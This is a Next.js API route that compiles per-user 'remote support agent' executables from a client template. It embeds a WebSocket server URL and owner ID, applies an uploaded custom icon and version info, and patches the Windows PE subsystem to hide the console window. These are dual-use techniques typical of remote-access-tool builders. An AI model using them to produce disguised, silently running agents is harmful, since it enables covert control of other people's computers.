import { NextRequest, NextResponse } from 'next/server';
import { readFileSync, writeFileSync, mkdirSync, existsSync, unlinkSync, copyFileSync, readdirSync, statSync as fsStatSync } from 'fs';
import { join, resolve, dirname } from 'path';
import { spawn } from 'child_process';
import { createRequire } from 'module';
import { verifyToken } from '@/lib/auth';
import { supabase } from '@/lib/supabase';

function resolveRootDir() {
  const cwd = process.cwd();
  const standaloneServer = join(cwd, 'server.js');
  if (existsSync(standaloneServer) && cwd.endsWith(join('.next', 'standalone'))) {
    return resolve(cwd, '..', '..');
  }
  return cwd;
}

// Build a minimal ICO file from a PNG buffer (single 256×256 entry stored as PNG)
function buildIcoFromPng(pngBuf: Buffer): Buffer {
  // ICO format: 6-byte header + 16-byte entry + PNG data
  const header = Buffer.alloc(6);
  header.writeUInt16LE(0, 0);      // reserved
  header.writeUInt16LE(1, 2);      // type: 1 = ICO
  header.writeUInt16LE(1, 4);      // count: 1 image

  const entry = Buffer.alloc(16);
  entry.writeUInt8(0, 0);          // width  (0 = 256)
  entry.writeUInt8(0, 1);          // height (0 = 256)
  entry.writeUInt8(0, 2);          // color palette
  entry.writeUInt8(0, 3);          // reserved
  entry.writeUInt16LE(1, 4);       // color planes
  entry.writeUInt16LE(32, 6);      // bits per pixel
  entry.writeUInt32LE(pngBuf.length, 8);  // image data size
  entry.writeUInt32LE(6 + 16, 12);        // offset to image data

  return Buffer.concat([header, entry, pngBuf]);
}

// Build a list of all possible node_modules roots for finding packages
function getNodeModulesRoots(): string[] {
  const roots: string[] = [];
  const rootDir = resolveRootDir();
  const cwd = process.cwd();

  // 1. Root app level (electron-builder puts prod deps here)
  roots.push(join(rootDir, 'node_modules'));
  // 2. CWD level (standalone)
  if (cwd !== rootDir) roots.push(join(cwd, 'node_modules'));
  // 3. Electron app resources level
  if (process.env.ELECTRON_RUN) {
    const exeDir = dirname(process.execPath);
    roots.push(join(exeDir, 'resources', 'app', 'node_modules'));
    roots.push(join(exeDir, 'resources', 'app.asar.unpacked', 'node_modules'));
  }
  // 4. Parent directories
  roots.push(join(dirname(cwd), 'node_modules'));
  roots.push(join(dirname(dirname(cwd)), 'node_modules'));

  return roots.filter(r => existsSync(r));
}

// Dynamically require a module, searching all possible locations
function requireFromRoots(moduleName: string): any {
  const roots = getNodeModulesRoots();
  for (const root of roots) {
    const modPath = join(root, moduleName);
    if (existsSync(modPath)) {
      try {
        const req = createRequire(join(root, '_'));
        return req(moduleName);
      } catch { /* try next */ }
    }
  }
  // Fallback: try normal require
  return require(moduleName);
}

function firstExistingPath(paths: string[]) {
  for (const p of paths) {
    if (existsSync(p)) return p;
  }
  return null;
}

function findPkgBaseBinary(cacheDir: string): string | null {
  if (!existsSync(cacheDir)) return null;
  try {
    const versions = readdirSync(cacheDir);
    for (const ver of versions) {
      const verDir = join(cacheDir, ver);
      if (!fsStatSync(verDir).isDirectory()) continue;
      const files = readdirSync(verDir);
      for (const f of files) {
        if (f.startsWith('fetched-') && f.includes('win')) {
          return join(verDir, f);
        }
      }
    }
  } catch { /* ignore */ }
  return null;
}

function runPkg(pkgBin: string, args: string[], cwd: string, env: NodeJS.ProcessEnv) {
  return new Promise<{ ok: boolean; output: string }>((resolvePromise) => {
    const isWinCmd = process.platform === 'win32' && pkgBin.toLowerCase().endsWith('.cmd');

    const child = isWinCmd
      ? spawn('cmd.exe', ['/d', '/s', '/c', pkgBin, ...args], {
          cwd,
          env,
          windowsHide: true,
          shell: false,
        })
      : spawn(pkgBin, args, {
          cwd,
          env,
          windowsHide: true,
          shell: false,
        });

    let output = '';
    const timer = setTimeout(() => {
      try { child.kill('SIGKILL'); } catch { /* ignore */ }
      resolvePromise({ ok: false, output: `${output}\nBuild timeout after 180s` });
    }, 180000);

    child.stdout.on('data', (d) => { output += d.toString(); });
    child.stderr.on('data', (d) => { output += d.toString(); });
    child.on('error', (e) => {
      clearTimeout(timer);
      resolvePromise({ ok: false, output: `${output}\n${e.message}` });
    });
    child.on('exit', (code) => {
      clearTimeout(timer);
      resolvePromise({ ok: code === 0, output });
    });
  });
}

export async function POST(req: NextRequest) {
  try {
    const rootDir = resolveRootDir();

    const defaultServerUrl = process.env.WS_SERVER_URL || process.env.NEXT_PUBLIC_WS_URL || 'ws://localhost:3001';
    const body = await req.json();
    const {
      serverUrl = defaultServerUrl,
      clientName = 'RemoteAgent',
      targetOS = 'win',
      iconBase64,
      iconFileName,
    } = body;

    // If a custom icon was uploaded (base64), save it to a temp file
    let customIconPath: string | null = null;
    if (iconBase64 && typeof iconBase64 === 'string' && iconFileName) {
      const buildDir = join(rootDir, '.build-tmp');
      if (!existsSync(buildDir)) mkdirSync(buildDir, { recursive: true });

      const isPng = /\.png$/i.test(iconFileName);
      const isIco = /\.ico$/i.test(iconFileName);

      if (isPng) {
        // Convert PNG to ICO using sharp or save as-is and convert later
        const pngBuf = Buffer.from(iconBase64, 'base64');
        const pngPath = join(buildDir, 'custom-icon.png');
        writeFileSync(pngPath, pngBuf);
        // Try to convert PNG to ICO using sharp
        try {
          const sharp = requireFromRoots('sharp');
          const resized = await sharp(pngBuf).resize(256, 256, { fit: 'contain', background: { r: 0, g: 0, b: 0, alpha: 0 } }).png().toBuffer();
          // Build a minimal ICO file from 256x256 PNG
          const icoPath = join(buildDir, 'custom-icon.ico');
          const ico = buildIcoFromPng(resized);
          writeFileSync(icoPath, ico);
          customIconPath = icoPath;
          console.log('[Build] Converted PNG to ICO via sharp');
        } catch {
          // sharp not available - try to use the PNG directly (resedit can sometimes handle it)
          // As fallback, create a basic ICO wrapper around the PNG
          const pngData = Buffer.from(iconBase64, 'base64');
          const icoPath = join(buildDir, 'custom-icon.ico');
          const ico = buildIcoFromPng(pngData);
          writeFileSync(icoPath, ico);
          customIconPath = icoPath;
          console.log('[Build] Created ICO from PNG (no sharp)');
        }
      } else if (isIco) {
        const icoBuf = Buffer.from(iconBase64, 'base64');
        const icoPath = join(buildDir, 'custom-icon.ico');
        writeFileSync(icoPath, icoBuf);
        customIconPath = icoPath;
        console.log('[Build] Using uploaded ICO directly');
      }
    }

    // Validate
    if (!serverUrl || typeof serverUrl !== 'string') {
      return NextResponse.json({ error: 'Server URL is required' }, { status: 400 });
    }
    if (!/^wss?:\/\/.+/.test(serverUrl)) {
      return NextResponse.json({ error: 'Invalid WebSocket URL (must start with ws:// or wss://)' }, { status: 400 });
    }

    const safeName = clientName.replace(/[^a-zA-Z0-9_-]/g, '_').substring(0, 32) || 'RemoteAgent';

    // Read template
    const templatePath = firstExistingPath([
      join(rootDir, 'server', 'client-template.js'),
      join(process.cwd(), 'server', 'client-template.js'),
      join(dirname(process.cwd()), 'server', 'client-template.js'),
    ]);
    if (!templatePath || !existsSync(templatePath)) {
      return NextResponse.json({ error: 'Client template not found' }, { status: 500 });
    }
    let template = readFileSync(templatePath, 'utf-8');

    // Inject config
    template = template.replace("'{{SERVER_URL}}'", `'${serverUrl}'`);
    template = template.replace("'{{CLIENT_NAME}}'", `'${safeName}'`);
    const serverId = process.env.SERVER_ID || 'none';
    template = template.replace("'{{SERVER_ID}}'", `'${serverId}'`);

    // Inject owner ID — resolve the CURRENT user UUID reliably
    // Priority: 1) JWT auth_token (most reliable), 2) user_id cookie, 3) fail
    let ownerId = '';

    // Try JWT first (set by Next.js login)
    const authToken = req.cookies.get('auth_token')?.value;
    if (authToken) {
      const jwtPayload = verifyToken(authToken);
      if (jwtPayload?.userId) {
        ownerId = jwtPayload.userId;
      }
    }

    // Fallback to user_id cookie (set by launcher login)
    if (!ownerId) {
      ownerId = req.cookies.get('user_id')?.value || '';
    }

    if (!ownerId) {
      return NextResponse.json({ error: 'Authentication required — user_id not found. Please re-login.' }, { status: 401 });
    }

    // CRITICAL: Verify this user_id actually exists in the users table
    // Prevents stale/deleted UUIDs from being embedded into clients
    const { data: ownerUser, error: ownerError } = await supabase
      .from('users')
      .select('id')
      .eq('id', ownerId)
      .single();

    if (ownerError || !ownerUser) {
      console.error(`[Build] owner_id ${ownerId} does not exist in users table — stale cookie?`);
      return NextResponse.json({
        error: 'Your user account was not found in the database. Please log out and log back in.',
      }, { status: 401 });
    }

    template = template.replace("'{{OWNER_ID}}'", `'${ownerId}'`);

    // Create temp build dir
    const buildDir = join(rootDir, '.build-tmp');
    if (!existsSync(buildDir)) {
      mkdirSync(buildDir, { recursive: true });
    }

    const srcFile = join(buildDir, `${safeName}.js`);
    const pkgJson = join(buildDir, 'package.json');

    writeFileSync(srcFile, template, 'utf-8');

    // Create package.json for pkg
    writeFileSync(
      pkgJson,
      JSON.stringify(
        {
          name: safeName.toLowerCase(),
          version: '1.0.0',
          bin: `./${safeName}.js`,
          pkg: {
            targets: [
              targetOS === 'linux'
                ? 'node18-linux-x64'
                : targetOS === 'macos'
                ? 'node18-macos-x64'
                : 'node18-win-x64',
            ],
            outputPath: '.',
          },
        },
        null,
        2
      ),
      'utf-8'
    );

    // Output directory
    const outputDir = join(rootDir, 'downloads');
    if (!existsSync(outputDir)) {
      mkdirSync(outputDir, { recursive: true });
    }

    // Determine output filename
    const ext = targetOS === 'win' ? '.exe' : targetOS === 'macos' ? '' : '';
    const outputFile = join(outputDir, `${safeName}${ext}`);

    // Clean previous build
    if (existsSync(outputFile)) {
      try { unlinkSync(outputFile); } catch { /* ignore */ }
    }

    // Find @yao-pkg/pkg bin.js — search all possible node_modules roots
    const pkgRelPath = join('@yao-pkg', 'pkg', 'lib-es5', 'bin.js');
    const pkgSearchPaths = getNodeModulesRoots().map(r => join(r, pkgRelPath));
    const pkgBinJs = firstExistingPath(pkgSearchPaths);
    if (!pkgBinJs) {
      return NextResponse.json(
        { error: `@yao-pkg/pkg not found. Searched: ${getNodeModulesRoots().join(', ')}` },
        { status: 500 }
      );
    }
    const target =
      targetOS === 'linux'
        ? 'node18-linux-x64'
        : targetOS === 'macos'
        ? 'node18-macos-x64'
        : 'node18-win-x64';

    // Pre-patch: embed icon + version info into the pkg base binary BEFORE pkg compiles.
    // This avoids corrupting pkg's VFS overlay (resedit/rcedit post-processing destroys it).
    let baseBinaryPath: string | null = null;
    let baseBinaryBackup: string | null = null;

    if (targetOS === 'win') {
      try {
        const pkgCacheDir = join(rootDir, '.pkg-cache');
        baseBinaryPath = findPkgBaseBinary(pkgCacheDir);
        if (baseBinaryPath) {
          baseBinaryBackup = baseBinaryPath + '.agent-bak';
          // Backup the original base binary
          copyFileSync(baseBinaryPath, baseBinaryBackup);

          const ResEdit = requireFromRoots('resedit');
          const baseData = readFileSync(baseBinaryPath);
          const exe = ResEdit.NtExecutable.from(baseData, { ignoreCert: true });
          const res = ResEdit.NtExecutableResource.from(exe);

          // Set icon if available
          const icoPath = customIconPath || firstExistingPath([
            join(rootDir, 'public', 'visualillusion_white.ico'),
            join(process.cwd(), 'public', 'visualillusion_white.ico'),
          ]);
          if (icoPath && existsSync(icoPath)) {
            const iconData = readFileSync(icoPath);
            const iconFile = ResEdit.Data.IconFile.from(iconData);
            ResEdit.Resource.IconGroupEntry.replaceIconsForResource(
              res.entries, 1, 1033,
              iconFile.icons.map((icon: { data: ArrayBuffer }) => icon.data)
            );
          }

          // Set version info (customised per agent name)
          const vi = ResEdit.Resource.VersionInfo.createEmpty();
          vi.setFileVersion(1, 0, 0, 0);
          vi.setProductVersion(1, 0, 0, 0);
          vi.setStringValues({ lang: 1033, codepage: 1200 }, {
            FileDescription: `${safeName} \u2014 VisualIllusion Remote Support Agent`,
            ProductName: 'VisualIllusion',
            CompanyName: 'VisualIllusion',
            LegalCopyright: '\u00A9 2026 VisualIllusion. All rights reserved.',
            OriginalFilename: `${safeName}.exe`,
            InternalName: safeName,
            FileVersion: '1.0.0.0',
            ProductVersion: '1.0.0.0',
          });
          vi.outputToResourceEntries(res.entries);

          res.outputResource(exe);
          const newBinary = Buffer.from(exe.generate());
          writeFileSync(baseBinaryPath, newBinary);
          console.log(`[Build] Pre-patched base binary with icon + version info for ${safeName}`);
        }
      } catch (patchErr: unknown) {
        console.warn('[Build] Pre-patch failed (non-fatal):', patchErr instanceof Error ? patchErr.message : patchErr);
        // Restore backup if patch failed midway
        if (baseBinaryPath && baseBinaryBackup && existsSync(baseBinaryBackup)) {
          try { copyFileSync(baseBinaryBackup, baseBinaryPath); unlinkSync(baseBinaryBackup); } catch { /* ignore */ }
        }
        baseBinaryBackup = null; // Don't try to restore again later
      }
    }

    const args = [pkgBinJs, srcFile, '--target', target, '--output', outputFile, '--compress', 'GZip'];

    // Use node.exe (or node from PATH) to run pkg bin.js directly
    const nodeBin = process.execPath || 'node';
    console.log(`[Build] Running: ${nodeBin} ${args.join(' ')}`);

    try {
      // Set NODE_PATH to all node_modules roots so pkg subprocess can find its dependencies
      const nodePathRoots = getNodeModulesRoots().join(process.platform === 'win32' ? ';' : ':');
      const result = await runPkg(nodeBin, args, buildDir, {
        ...process.env,
        PKG_CACHE_PATH: join(rootDir, '.pkg-cache'),
        // PKG_NODE_PATH tells pkg-fetch to skip hash verification of the base binary.
        // This is needed because we pre-patched the base binary with icon + version info.
        PKG_NODE_PATH: baseBinaryPath || '',
        NODE_PATH: nodePathRoots,
      });
      console.log('[Build] output:', result.output);
      if (!result.ok) {
        return NextResponse.json(
          { error: 'Build failed', details: result.output || 'pkg returned non-zero code' },
          { status: 500 }
        );
      }
    } catch (buildErr: unknown) {
      const msg = buildErr instanceof Error ? buildErr.message : String(buildErr);
      console.error('[Build] Error:', msg);
      return NextResponse.json(
        { error: 'Build failed', details: msg },
        { status: 500 }
      );
    } finally {
      // Always restore the base binary after pkg finishes
      if (baseBinaryPath && baseBinaryBackup && existsSync(baseBinaryBackup)) {
        try {
          copyFileSync(baseBinaryBackup, baseBinaryPath);
          unlinkSync(baseBinaryBackup);
          console.log('[Build] Base binary restored');
        } catch { /* ignore */ }
      }
    }

    // Verify output exists
    if (!existsSync(outputFile)) {
      return NextResponse.json(
        { error: 'Build completed but output file not found' },
        { status: 500 }
      );
    }

    // Patch PE subsystem: CONSOLE (3) → GUI (2) to hide the console window
    if (targetOS === 'win') {
      try {
        const peData = readFileSync(outputFile);
        // e_lfanew at offset 0x3C tells us where the PE signature is
        const peOffset = peData.readUInt32LE(0x3C);
        // Subsystem is at peOffset + 0x5C (offset 92 into NT headers)
        const subsystemOffset = peOffset + 0x5C;
        const currentSubsystem = peData.readUInt16LE(subsystemOffset);
        if (currentSubsystem === 3) { // IMAGE_SUBSYSTEM_WINDOWS_CUI
          peData.writeUInt16LE(2, subsystemOffset); // IMAGE_SUBSYSTEM_WINDOWS_GUI
          writeFileSync(outputFile, peData);
          console.log('[Build] Patched PE subsystem: CUI → GUI (console hidden)');
        }
      } catch (peErr: unknown) {
        console.warn('[Build] PE subsystem patch failed (non-fatal):', peErr instanceof Error ? peErr.message : peErr);
      }
    }

    // Clean temp
    try {
      unlinkSync(srcFile);
      unlinkSync(pkgJson);
    } catch { /* ignore */ }

    // Read the file and return as download
    const fileBuffer = readFileSync(outputFile);
    const fileName = `${safeName}${ext}`;

    return new NextResponse(fileBuffer, {
      status: 200,
      headers: {
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': `attachment; filename="${fileName}"`,
        'Content-Length': fileBuffer.length.toString(),
        'X-File-Name': fileName,
        'X-File-Path': outputFile.replace(/\\/g, '/'),
      },
    });
  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : 'Unknown error';
    console.error('[Build API]', msg);
    return NextResponse.json({ error: msg }, { status: 500 });
  }
}

// GET endpoint to list built files
export async function GET() {
  try {
    const rootDir = resolveRootDir();
    const outputDir = join(rootDir, 'downloads');
    if (!existsSync(outputDir)) {
      return NextResponse.json({ files: [] });
    }

    const { readdirSync, statSync } = require('fs');
    const files = readdirSync(outputDir)
      .filter((f: string) => f.endsWith('.exe') || !f.includes('.'))
      .map((name: string) => {
        const filePath = join(outputDir, name);
        const stat = statSync(filePath);
        return {
          name,
          size: stat.size,
          createdAt: stat.birthtime.toISOString(),
          path: filePath.replace(/\\/g, '/'),
        };
      });

    return NextResponse.json({ files });
  } catch {
    return NextResponse.json({ files: [] });
  }
}
